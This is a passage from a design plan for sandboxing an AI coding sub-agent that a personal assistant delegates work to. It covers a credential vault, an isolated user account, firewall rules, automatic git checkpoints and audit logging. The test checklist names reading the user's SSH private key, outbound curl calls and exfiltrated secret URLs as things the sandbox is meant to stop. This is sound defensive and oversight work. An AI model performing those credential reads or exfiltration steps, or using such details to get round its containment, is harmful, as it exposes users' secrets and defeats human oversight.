    // Auto-commit if tool modified files
    if toolModifiesFiles(toolName) && result.Success {
        gitCommit(a.workspace, formatCommitMessage(toolName, args))
    }
    
    // Checkpoint commits for milestones
    if toolName == "run_build" && result.Success {
        gitTag(a.workspace, fmt.Sprintf("build-passing-%d", time.Now().Unix()))
    }
    if toolName == "run_test" && result.Success {
        gitTag(a.workspace, fmt.Sprintf("tests-passing-%d", time.Now().Unix()))
    }
    
    return result
}
```

**Git history in workspace:**

```bash
$ git log --oneline
a3b5c7e (HEAD -> main) edit_file: main.go
2f8d9a1 (tag: build-failed-1714757890) [checkpoint]
e4c1f6b write_file: main.go
d9a2b8c write_file: skill.yaml
7c3e5f1 (tag: task-start-1714757800) Initial workspace: skillkit reference
```

**Rollback on failure:**

```go
// If task fails, workspace stays intact with full git history
func handleCodingFailure(workspaceDir, skillName string, err error) {
    gitLog := exec.Command("git", "-C", workspaceDir, "log", "--oneline", "-10").Output()
    
    eventBus.Emit(tui.CodingCompleteEvent{
        SkillName: skillName,
        Success:   false,
        Error:     err,
        GitLog:    string(gitLog),  // For debugging
    })
    
    // Workspace preserved for retry or inspection
}
```

**Retry from checkpoint:**

```yaml
# tools/retry_coding_task/tool.yaml
name: retry_coding_task
parameters:
  task_id: string
  new_instructions: string
  reset_to: string  # Optional: "task-start-..." or "build-passing-..."
```

### 8.4 Discovery Tools

**List all coding tasks:**

```yaml
# tools/list_coding_tasks/tool.yaml
name: list_coding_tasks
description: List all coding tasks (current and historical)
parameters:
  status:
    enum: [all, in_progress, completed, failed]
    default: all
  limit:
    type: integer
    default: 10
```

**Example output:**

```
✓ job_tracker (2m 34s) — Created job tracker with CRUD operations
✓ recipe_scraper (1m 12s) — Built recipe scraper with ingredient extraction
✗ transit_api (45s) — Build failed: missing API credentials
⏳ weather_extended (currently running) — Extending weather tool
```

**Mira can answer naturally:**

```
User: "What have you been working on this week?"

Mira:
  list_coding_tasks(status="completed", limit=20)
  reply("This week I built:\n- Job tracker (tracks applications)\n- Recipe scraper (extracts ingredients)\n- Book search update (new API)\n\nAll tested and working!")
```

### 8.5 Event Bus Integration

```go
// tui/event.go (add new event type)
type CodingCompleteEvent struct {
    EventTime   time.Time
    EventSource string
    SkillName   string
    Success     bool
    Summary     string
    GitLog      string  // Git history for debugging
    Error       error
}

func (e CodingCompleteEvent) Time() time.Time   { return e.EventTime }
func (e CodingCompleteEvent) Source() string    { return e.EventSource }
```

**Agent sees this as:**
```
System event: Background coding task completed.
Skill: job_tracker
Status: Success
Summary: Created job tracker skill with CRUD operations for applications table
```

The agent can then:
- Test the skill (`run_skill`)
- Tell the user it's ready
- Fix it if tests fail

---

## 9. Implementation Phases

### Phase 1: Credential Vault (1-2 days)

**Goal:** Secrets are no longer exposed in process environments.

- [ ] Implement `vault/server.go` (HTTP server, listens on localhost)
- [ ] macOS Keychain integration (`vault/keychain.go`)
- [ ] CLI commands: `her vault set`, `her vault list`, `her vault delete`
- [ ] Update skill runner to inject vault URLs instead of raw secrets
- [ ] Test: skill calls vault URL, gets real secret back
- [ ] Test: exfiltrated URL is useless (returns 403 or timeout)

**Deliverable:** API keys stored in macOS Keychain, accessed via localhost URLs.

---

### Phase 2: Limited User Sandbox (2-3 days)

**Goal:** Coding agent runs in an isolated user account.

- [ ] Write setup script: `scripts/setup-coding-sandbox.sh`
  - Creates `sam` user
  - Sets up home directory structure
  - Installs Go toolchain (read-only)
  - Installs uv/Python (read-only)
- [ ] Implement sandbox prep: `coding/sandbox.go`
  - `rsync` skill directory into sandbox
  - `rsync` results back out
  - Cleanup after completion
- [ ] Configure pf.conf firewall rules
- [ ] Test: sandbox user cannot read `/Users/autumn/.ssh/id_rsa`
- [ ] Test: sandbox user cannot reach `curl https://google.com`
- [ ] Test: sandbox user CAN reach `pkg.go.dev`

**Deliverable:** `sam` user exists, network filtered, file access restricted.

---

### Phase 3: Coding Agent Tool Set (1 week)

**Goal:** Build the `sam` binary with scoped tools.

- [ ] Tool definitions: `coding-tools/<name>/tool.yaml` for each tool
- [ ] Tool implementations:
  - [ ] `read_file`, `write_file`, `edit_file` (with path validation)
  - [ ] `list_files`, `search_code` (workspace-scoped)
  - [ ] `run_build`, `run_test`, `run_lint` (controlled commands)
  - [ ] `fetch_docs` (MCP client integration)
  - [ ] `think`, `done` (agent loop control)
- [ ] Agent loop: `coding/agent.go`
  - Load tools from YAML
  - LLM iteration (call Opus/Gemini)
  - Tool dispatch
  - Progress reporting (emit to stdout, main harness captures)
- [ ] Build binary: `go build -o /usr/local/bin/sam cmd/coding-agent/main.go`
- [ ] Test: manually run agent on a simple task ("create a hello world skill")

**Deliverable:** `sam` binary that can iterate on code in a workspace.

---

### Phase 4: Integration with Main Agent (3-4 days)

**Goal:** Mira can delegate coding tasks and see results.

- [ ] Extend `send_task` tool to accept `coding` task type
- [ ] Implement task queue: `coding/queue.go`
- [ ] Background goroutine: `ProcessCodingTasks`
- [ ] Event emission: `CodingCompleteEvent`
- [ ] Agent prompt update: Mira knows about `send_task(task_type="coding")`
- [ ] Test: full flow
  - User: "Build me a job tracker"
  - Mira: `send_task(...)` + `reply("Building it...")`
  - Coding agent works in background
  - Event fires
  - Mira: `run_skill(...)` + `reply("Done! Here's your job tracker.")`

**Deliverable:** End-to-end coding task delegation from user request to working skill.

---

### Phase 5: Refinement & Hardening (ongoing)

- [ ] Add `analyze_error` deferred tool (uses cheap model for error diagnosis)
- [ ] Network proxy (optional defense-in-depth)
- [ ] Skill validation: check `skill.yaml` schema, binary signature
- [ ] Trust promotion: `her trust promote <skill>` computes hash, marks as 2nd-party
- [ ] Audit logging: all coding tasks logged to `coding_audit` table
- [ ] Rate limiting: max N coding tasks per hour
- [ ] Timeout enforcement: kill coding agent after 10 minutes

---

## 10. Resolved Design Questions

### From Planning Session (2026-04-23)

#### 1. Vault Authentication
**Decision:** Auth token header

Skillkit sends `X-Skill-Auth: <token>` header with each vault request. Vault validates the token and checks permissions. More portable than TCP connection inspection, cleaner than per-skill Unix sockets.

#### 2. Concurrent vs Sequential Coding
**Decision:** Sequential (one task at a time)

Simpler to implement and debug. LLM API rate limits won't be hit. Easier to monitor progress. Can add concurrency later if needed, but MVP is one coding task at a time.

#### 3. Skill Testing During Build
**Decision:** Yes, run skills in nested sandbox

Coding agent CAN execute skills during build for testing, but only in a nested sandbox:
- Limited user (`sam`) is outer layer
- `sandbox-exec` with read-only fs + no network is inner layer  
- `gtimeout` enforces 5-second hard limit
- See [§7 Network Isolation](#7-network-isolation) for seatbelt profile

This lets the agent iterate on runtime errors without exposing the system.

#### 4. Progress Tracking
**Decision:** Inbox pattern with automatic capture

Progress is captured automatically from tool calls (no agent cooperation required). Every tool execution writes to the inbox. Mira can query progress anytime via `check_coding_progress`. See [§8.2 Progress Tracking](#82-progress-tracking-coding-inbox).

#### 5. Rollback Strategy
**Decision:** Git-per-workspace, fully automatic

Each workspace is a local git repo. Commits happen automatically after every file modification. The coding agent never knows git exists — it's all harness infrastructure. See [§8.3 Automatic Git Versioning](#83-automatic-git-versioning).

---

## References

- [Alcoholless: Lightweight macOS Security Sandbox](https://medium.com/nttlabs/alcoholless-a-lightweight-security-sandbox-for-macos-programs-homebrew-ai-agents-etc-ccf0d1927301)
- [SandVault: Run AI Agents in Isolated macOS User](https://github.com/webcoyote/sandvault)
- [sandbox-exec: macOS's Little-Known Command-Line Sandboxing Tool](https://igorstechnoclub.com/sandbox-exec/)
- [macOS Sandbox - HackTricks](https://angelica.gitbook.io/hacktricks/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox)
- [What I Learned Building a Minimal Coding Agent (pi-coding-agent)](https://mariozechner.at/posts/2025-11-30-pi-coding-agent/)
- [Cursor Agent Sandboxing](https://cursor.com/blog/agent-sandboxing)
- [OWASP AI Agent Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html)
- [Crush GitHub Repository](https://github.com/charmbracelet/crush)
- [Navigating Security Tradeoffs of AI Agents (Palo Alto Unit42)](https://unit42.paloaltonetworks.com/navigating-security-tradeoffs-ai-agents/)
- [keybase/go-keychain](https://github.com/keybase/go-keychain) — macOS Keychain access from Go

---

## Next Steps

1. Review and refine this plan
2. Prioritize Phase 1 (credential vault) as foundation
3. Write detailed implementation specs for each phase
4. Build Phase 1, test thoroughly, iterate
5. Proceed to Phase 2 only when Phase 1 is solid

**This is a marathon, not a sprint. Get the security layers right before adding features.**
